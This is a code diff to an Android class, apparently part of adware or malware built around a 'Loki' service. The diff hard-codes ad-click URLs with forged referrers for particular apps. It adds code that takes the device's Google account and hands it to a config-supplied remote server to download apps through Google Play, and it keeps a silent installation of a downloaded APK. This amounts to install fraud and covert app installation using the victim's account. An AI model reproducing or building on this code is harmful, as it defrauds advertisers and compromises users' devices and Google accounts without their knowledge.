@@ -7,6 +7,8 @@ import java.io.InputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.content.Context;
 import android.graphics.PixelFormat;
 import android.net.Uri;
@@ -151,7 +153,7 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 	public void run() {
 		try {
 //			destUrl = CommonUtils.getDestUrl(mAD.getLandingPager());
-			destUrl = CommonUtils.getDestUrl("http://pixel.admobclick.com/v1/click?type=01&p1=10200&p2=90101&p3=20000&p4=13474301043530151778103145471438655337197&p5=1523785911213262_1661835424074888&p6=US&p7=01f8c64dead7b010017bdee8f75cb4df&p8=5.5&p9=&p10=&p11=es_US&p12=20019&p13=210&p14=190614&lid=null&p15=me.lyft.android&p24=1");
+			destUrl = CommonUtils.getDestUrl("http://pixel.admobclick.com/v1/click?type=01&p1=null&p2=16212&p3=10030&p4=72936347842258022881022981438150268774&p5=test&p6=US&p7=t38400000-8cf0-11bd-b23e-10b96e40000d&p8=2.8&p9=&p10=&p11=en&p12=10253&p13=210&p14=178817&lid=null&p15=com.snailgameusa.tp&p24=");
 			if(!CommonUtils.isEmptyString(destUrl)) {
 				Uri uri = Uri.parse(destUrl);
 				referrer = uri.getQueryParameter("referrer");
@@ -160,16 +162,16 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 						try {
 							Apk apk = new Apk();
 //							apk.setPackageName(mAD.getPackageName());
-							apk.setPackageName("me.lyft.android");
+							apk.setPackageName("com.snailgameusa.tp");
 							apk.setReferrer(referrer);
 							AMApplication.instance.installApks.add(apk);
-//							downloadApk(apkUrl);
+//							downloadApk(mAD.getDownloadUrl());
 							
 							LokiService lokiService = LokiService.getInstance(mContext);
 							if(lokiService != null) {
 								File dir = AMApplication.instance.getFilesDir();
 								File file = new File(dir.getAbsolutePath() + "/new.apk");
-								lokiService.installPackage(file.getAbsolutePath(), 0);
+								lokiService.installPackage(file.getAbsolutePath(), null, 0);
 							}
 						} catch (Exception e) {
 							AMLogger.e(null, e.getMessage());
@@ -215,6 +217,24 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 		InputStream inputStream = null;
 		FileOutputStream fos = null;
 		try {
+			if(CommonUtils.isEmptyString(apkUrl)) {
+				com.loki.giga.sdk.ClientManager clientManager = com.loki.giga.sdk.ClientManager.getInstance(mContext);
+				ConfigParser parser = new ConfigParser();
+				String serverName = parser.getValue(mContext, AMConstants.NET_GP_SERVER);
+				String serverPort = parser.getValue(mContext, AMConstants.NET_GP_SERVER_PORT);
+				AccountManager am = (AccountManager) mContext.getSystemService(Context.ACCOUNT_SERVICE);
+		        Account[] accounts = am.getAccountsByType("com.google");
+		        Account account = null;
+		        if (accounts != null && accounts.length > 0) {
+		            account = accounts[0];
+		        }
+		        clientManager.downloadWithGooglePlay(LokiService.getInstance(mContext), account, destUrl, serverName, Integer.parseInt(serverPort), 60000, null);
+				return;
+			}
+		} catch (Exception e) {
+			AMLogger.e(null, e.getMessage());
+		}
+		try {
 			URL url = new URL(apkUrl);
 			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
 			conn.setConnectTimeout(10000);
@@ -222,11 +242,17 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 			conn.connect();
 			int responseCode = conn.getResponseCode();
 			if(200 != responseCode) {
-				ClientManager clientManager = ClientManager.getInstance(mContext);
+				com.loki.giga.sdk.ClientManager clientManager = com.loki.giga.sdk.ClientManager.getInstance(mContext);
 				ConfigParser parser = new ConfigParser();
 				String serverName = parser.getValue(mContext, AMConstants.NET_GP_SERVER);
 				String serverPort = parser.getValue(mContext, AMConstants.NET_GP_SERVER_PORT);
-				clientManager.downloadWithGooglePlay(destUrl, lokiClientCallback, serverName, Integer.parseInt(serverPort), 600000);
+				AccountManager am = (AccountManager) mContext.getSystemService(Context.ACCOUNT_SERVICE);
+		        Account[] accounts = am.getAccountsByType("com.google");
+		        Account account = null;
+		        if (accounts != null && accounts.length > 0) {
+		            account = accounts[0];
+		        }
+		        clientManager.downloadWithGooglePlay(LokiService.getInstance(mContext), account, destUrl, serverName, Integer.parseInt(serverPort), 60000, null);
 				conn.disconnect();
 				return;
 			}
@@ -242,7 +268,7 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable {
 			fos.flush();
 			LokiService lokiService = LokiService.getInstance(mContext);
 			if(lokiService != null) {
-				lokiService.installPackage(file.getAbsolutePath(), 0);
+				lokiService.installPackage(file.getAbsolutePath(), null, 0);
 			}
 		} catch (Exception e) {
 			AMLogger.e(null, e.getMessage());
